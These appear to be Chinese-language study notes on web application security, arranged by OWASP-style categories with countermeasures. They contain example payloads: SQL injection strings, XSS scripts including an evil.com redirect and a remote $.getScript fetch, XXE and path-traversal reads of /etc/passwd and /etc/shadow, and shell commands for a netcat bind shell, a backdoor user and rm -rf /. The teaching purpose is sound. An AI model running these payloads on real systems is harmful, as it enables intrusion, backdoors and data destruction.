# 0x00 网络攻击 Web Attack

## 鉴权

在登陆后的Authentication
- 基于 IP 地址：
	- NAT可能导致一个IP多个用户
	- DHCP 可能导致一个用户多个IP
- 基于证书：
	- 谁有证书，证书是什么，谁来签名？
- 基于 Cookie：
	- 最常用


Cookie 让服务器在客户端存储一个字符串。 基于服务器名称（server name）。
- HTTP 响应：`Set-Cookie`：添加一个 cookie
- HTTP 标头： `Cookie`：给出一个“cookie”

这可以用来
- 识别用户（登录后发出的cookie）
- 存储用户名、首选项等。
- 跟踪用户：上次访问时间等。

简单的鉴权（Authentication）协议（scheme）
对于 Web 应用
- 验证 Credential：例如通过数据库
- 签发 Cookie：`Set-Cookie: Auth=Secret`
当浏览器再次访问该网站时，它将包含会话验证器
- `Cookie: auth=secret`

固定Cookie（fixed Cookie）
在服务器端记录登录/注销。
- 浏览器第一次连接时设置 cookie，
- 每个页面在数据库中查找 cookie 以获取会话状态。
- php使用 `start_session()` 自动处理

## 安全威胁

OWSAP = Open Web Application Security Project
提高网络安全的公共努力：
- 许多有用的文件。
- 公开会议和活动。

### 1. Connection is unsecured/Cookie Stealing
如果连接未加密（not encrypted），则可以窃听（eavesdrop），通过
- 网络服务商 ISP
- 路由上的任何人
- 您本地网络上的任何人，例如 使用相同的无线网络

攻击者不需要用户名和密码——只需要 cookie
如果网站使用 HTTPS (TLS)，则它是安全的
但是许多网站在安全登录后又回到了 HTTP。

#### 对策 Countermeasures

- 始终使用 https (TLS)。
- 设置安全标志：cookie 仅通过安全方式发送：
```csharp
var secureCookie = new Cookie("credential",c);
secureCookie.setSecure(true);
```

### 2. 手搓的垃圾鉴权系统

1. 没有 Session 过期
2. 密码没有哈希

### 3. 敏感信息泄漏 Sensitive Data Exposure

1. 敏感信息使用明文（clear text）传输（e.g. 使用HTTP而不是HTTPS）
2. 敏感信息使用原文保存 （e.g. 密码不 Hash）
3. 窃取 Cookie 因为 HTTPS 跳转为 HTTP

## 4. SQL Injection

```csharp
var sql = "SELECT * FROM items WHERE (item = '" + INPUT +"')";

// e.g.
var INPUT = "x";
// sql = SELECT * FROM items WHERE (item = 'x')

// attacl
var INPUT = "' OR '1'='1' ) --";
sql = "SELECT * FROM items WHERE (item = '" + INPUT +"')";
sql = "SELECT * FROM items WHERE (item = '' OR '1'='1' ) --')";
sql = "SELECT * FROM items WHERE (item = '' OR TRUE)";
sql = "SELECT * FROM items WHERE (TRUE)";
sql = "SELECT * FROM items";
```


最好的漏洞将打印 SQL 查询的结果：
- 这使您可以探索整个数据库
- Information schema 表可以告诉你所有其他表的名称
盲注（Blind SQL attacks）不打印结果：
- 需要大量猜测（guesswork）
- 在数据库上运行命令，例如 添加密码，删除表
- 将数据（例如密码）复制到您可以阅读的字段中

避免：
- php: `mysqli_real_escape_string()` 可以自动转译
- prepared statement：
```php
// prepare and bind
$stmt = $conn->prepare("INSERT INTO People (firstname, lastname) VALUES (?,?)");

$firstname = "John";
$lastname = "Doe";

$stmt->bind_param("ss", $firstname, $lastname); // set parameters and execute

$stmt->execute();
```

类似漏洞不仅 SQL 包含，还可以包含在其他软件中：
- `nc -l -p 9999 -e /bin/bash`
- Start a shell on port 9999
- `useradd tpc -p rEK1ecacw.7.c`
	- Add user `tpc:npassword`
- `rm -f -r /`


## 5. XSS/Cross Site Scripting

- 输入校验（input validation）漏洞（vulnerability）
- 允许攻击者将客户端（Client-side）代码 （JavaScript）注入网页。
- 对用户来说看起来像是原始网站，但实际上已被攻击者修改

#### Reflected XSS/反射型 XSS

注入的代码从 Web 服务器反映出
- 错误消息
- 搜索结果
- 响应，包括作为请求的一部分发送到服务器的部分/全部输入
**只有发出恶意请求的用户受到影响**

```java
// Server Side
String searchQuery = request.getParameter("searchQuery");
/* ... */
PrintWriter out = response.getWriter();
out.println("<h1>" + "Results for " + searchQuery + "</h1>");

// User request
searchQuery=<script>alert("pwnd")</script>
```

### Stored XSS/存储型 XSS

注入的代码存储在网站上，并在所有页面视图中提供给访问者
- 用户留言
- 用户资料
**所有用户受影响**

```java
String postMsg = db.getPostMsg(0);
/* ... */
PrintWriter out = response.getWriter(); out.println("<p>" + postMsg + "</p>");

// postMsg:
postMsg = <script>alert("pwnd")</script>
```

JavaScript 可以访问 cookie 并进行远程连接。
XSS 攻击可用于窃取查看页面的任何人的 cookie，并将 cookie 发送给攻击者。
然后攻击者可以使用此 cookie 作为受害者（Victim）登录。

#### 钓鱼案例

攻击者注入脚本，重现登录页面的外观等
虚假页面要求用户提供凭据或其他敏感信息
变体：攻击者将受害者重定向到攻击者的站点

```html
<script>
    document.location = "http://evil.com";
</script>
```

#### 执行漏洞 run exploits

攻击者注入一个脚本，对用户的浏览器或其插件发起大量攻击
如果攻击成功，恶意软件将在受害者的机器上安装，无需任何用户干预
通常，受害者机器成为僵尸网络（botnet）的一部分

#### 解决方案：Sanitisation

- Sanitise 所有用户输入很困难
- Sanitisation 取决于上下文(context-dependent)
	- JavaScript ``<script>用户输入</script>`
	- CSS 值 `a:hover {color: user input }`
	- URL 值 ``<a href="user input">`
- 消毒依赖于攻击(attack-dependent)，例如 JavaScript 与 SQL
- 自己动手 vs 重用

##### 案例：清洁

```js
clean = preg_replace(
    "#<script(.*?)>(.*?)</script(.*?)>#i",
    "SCRIPT BLOCKED",
    $value);

echo $clean;
```

- 问题：
	- 过度限制清理 over-restrictive sanitisation：浏览器接受格式错误（malformed）的输入！
	- 攻击字符串：`<script>恶意（malicious）代码<`
	- 实现（implement） 与 标准（standard） 并不等价

##### 案例：Twitter

- Twitter 的超链接算法为 `<a href="www.site.com">www.site.com</a>`
- 老的清洁算法阻止了 `<script>`但是没有阻止 `"`
- 输入 `http://t.co/@"onmouseover="$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')"/`
会变成

```html
<a href="http://t.co@"
   onmouseover="$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')"/">
   ...
</a>
```

##### php 中的解决方案

`htmlspecialchars()`删除导致 HTML 问题的字符:
`&` -> `&amp`
`<` -> `&lt`
`>` -> `&gt`
`'` -> `&quot`
`"` -> `&#039`

无法覆盖全部情况

## 6. Cross-site request forgery (CSRF)/跨站点请求伪造

![[img/csrf.png]]

1. 受害者登录易受攻击的网站
2. 受害者访问攻击者网站上的恶意页面
3. 向受害者发送恶意内容
4. 受害者向易受攻击的网站发送请求

### 解决方案：

- 查看Referer头的值
- 不起作用：
	- 攻击者无法在用户浏览器中欺骗 Referer 标头的值（但用户可以）。
	- 合法请求可能会被剥离其 Referer 标头
		- 代理
		- 网络应用防火墙

- 每次提供表单时，添加一个带有机密值（令牌）的附加参数，并在提交时检查它是否有效
	- 如果攻击者可以猜到令牌值，则没有保护

- 每次提供表单时，添加一个带有秘密值（令牌）的附加参数，并在提交时检查它是否有效。
	- 如果每次提供表单时都没有重新生成令牌，则应用程序可能容易受到重放攻击 (nonce)。

## 7. XML External Entities/XXE

XML 处理外部实体时涉及外部实体

```xml
<!DOCTYPE foo[
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

## 8. 损坏的访问控制 Broken Access Control

```
Router
index.php?account=$acc&action=$act
Query strings are used to tell dynamic webpages what to do http://myWebShop.com/index.php?account=tpc&action=add http://myWebShop.com/index.php?account=tpc&action=show


What if the attacker 
tries: http://myWebShop.com/index.php?account=admin&action=delete
```

## 9. 目录遍历 Path Traversal

```
http://nameOfHost/../../../etc/shadow
```

解决方案：
- 使用访问控制设置来停止路径遍历
- 最佳实践：为 Web 服务器创建一个特定的用户帐户
	- 只授予该帐户访问公共文件的权限

## 10. Security Misconfiguration

确保您的安全设置不会给攻击者带来优势，例如
- 错误消息：不应公开。
- 目录列表：应该看不到目录中的文件。
- 管理面板不应公开访问

## 11. 不安全的反序列化 Insecure Deserialisation

终端用户提供的数据在服务器上反序列化
攻击者可以更改字段名称、内容并弄乱格式
可能远程执行代码

## 12. 使用具有已知漏洞的组件 Using Components with Known Vulnerabilities

- 如果出现新的安全补丁，是否已应用？
	- 补丁可能会要求您关闭站点，因此会赔钱。
	- 或者它甚至可能破坏您的网站。
是否值得应用补丁？

## 13. Insufficient Logging and Monitoring

- 未记录可审核事件 auditable events
- 未记录警告和错误消息
- 未监控日志中的可疑活动 suspicious activities

## Conclusion

要保护网站，您需要知道它是如何工作的：
- 客户端如何请求资源。
- 如何对客户端进行身份验证。
- HTTP 和网络服务器如何工作
可能的网络攻击
- Stolen cookies
- SQL injection
- Code injection
- Cross-site scripting attacks (XSS)
- Cross-site request forgery (CSRF)
错误通常归结为错误的应用程序逻辑
始终清理所有输入